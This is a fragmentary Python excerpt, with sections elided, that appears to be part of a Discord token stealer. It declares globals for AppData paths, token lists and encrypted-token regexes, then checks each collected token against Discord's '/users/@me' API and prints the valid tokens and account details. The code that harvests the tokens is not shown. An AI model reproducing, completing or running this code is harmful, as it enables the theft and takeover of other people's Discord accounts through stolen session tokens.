...
global API_VERSION, BASE_URL, appdata, roaming, tokens, uids, regexp, regexp_enc
API_VERSION = "v9"
BASE_URL = f"https://discord.com/api/{API_VERSION}/users/@me"
...
def validate_token(token: str) -> bool:
        if requests.get(BASE_URL, headers={'Authorization': token}).status_code == 200:
            print("[VALID]: "+ token)
            return True
        return False
...
def run():
    ...
    for token in tokens:
        user = requests.get(
            'https://discord.com/api/v9/users/@me', headers={'Authorization': token}).text
        print(user)
